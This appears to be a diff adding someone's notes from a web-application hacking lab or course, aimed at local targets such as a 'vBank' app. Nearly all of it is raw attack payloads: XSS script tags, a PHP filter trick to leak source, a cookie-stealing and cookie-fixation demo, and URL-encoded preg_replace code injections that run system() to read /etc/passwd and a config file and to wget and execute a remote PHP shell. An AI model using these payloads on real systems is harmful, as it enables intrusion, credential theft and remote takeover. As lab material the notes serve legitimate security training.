@@ -1,0 +1,67 @@
+1) <script src="http://127.0.0.1/e_single.js"></script>
+   <script src="http://127.0.0.1/e.js"></script>
+
+2) 
+
+php://filter/convert.base64-encode/resource=index.php
+
+echo <base64> | base64 -d > index.php    ----- check again
+
+analyze index.php
+
+create venice and vienna txt for params + put flag as cookie
+
+steghide extract -sf alv_stegofile.jpg -p la_stravaganza
+
+cat flag
+
+3)
+
+(((BEI FELIX ZEIGEN WEIL 2 BROWSER))
+
+node index.js
+
+http://127.0.0.1:3000/
+
+http://127.0.0.1:3000/attacker
+
+copy cookie
+
+
+precautions:
+
+https, secure cookie, httponly
+
+4)
+
+<meta http-equiv="Set-Cookie" content="USECURITYID=blub; path=/">
+
+5)
+1) %22[1]\b%23e%27,%20system('ls'),%20%27%1%27);%20preg_replace(%27%23\b%22
+   '.system('ls').'
+2) %22[1]\b%23e%27,%20system('cat /var/www/html/vBank/etc/config.php | base64'),%20%27%1%27);%20preg_replace(%27%23\b%22
+   '.system('cat /var/www/html/vBank/etc/config.php | base64').'
+3) %22[1]\b%23e%27,%20phpinfo(),%20%27%1%27);%20preg_replace(%27%23\b%22
+   '.phpinfo().'
+5) %22[1]\b%23e%27,%20system('cat /etc/passwd'),%20%27%1%27);%20preg_replace(%27%23\b%22
+   '.system('cat /etc/passwd').'
+   '.exec('cat /etc/passwd').'
+   '.passthru('cat /etc/passwd').'
+   '.shell_exec('cat /etc/passwd').'
+
+
+https://www.php.net/manual/en/function.exec.php
+   
+
+6) %22[1]\b%23e%27,%20system('find /var/www/html/vBank/ *'),%20%27%1%27);%20preg_replace(%27%23\b%22
+   %22[1]\b%23e%27,%20system('find /var/www/html/vBank/ * -exec cat {} \;'),%20%27%1%27);%20preg_replace(%27%23\b%22
+	
+   '.system('find /var/www/html/vBank/ *').'
+   '.system('find /var/www/html/vBank/ * -exec cat {} \;').'
+7) %22[1]\b%23e%27,%20system('wget http://127.0.0.1/shell.txt -O shell.php; php -f shell.php'),%20%27%1%27);%20preg_replace(%27%23\b%22
+   '.system('wget http://127.0.0.1/shell.txt -O shell.php; php -f shell.php').'
+   
+   had to change the file permissions manually as it was set to 744
+   sudo chmod 766 htbmain.page
+
+
